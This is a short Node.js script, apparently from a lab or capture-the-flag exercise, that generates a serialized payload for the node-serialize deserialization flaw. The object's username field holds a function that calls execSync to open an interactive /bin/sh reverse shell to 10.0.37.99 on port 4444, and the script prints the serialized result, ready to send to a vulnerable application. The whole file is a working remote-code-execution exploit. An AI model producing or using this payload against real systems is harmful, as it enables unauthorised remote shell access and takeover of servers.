const nodeserialize = require('node-serialize');

let user = {};

user.id = 169767593875.68103
user.name = 'admin';

user.username = function () {require('child_process').execSync('/bin/sh -i >& /dev/tcp/10.0.37.99/4444 0>&1')}

objeto_serializado = nodeserialize.serialize(user);
console.log(objeto_serializado);
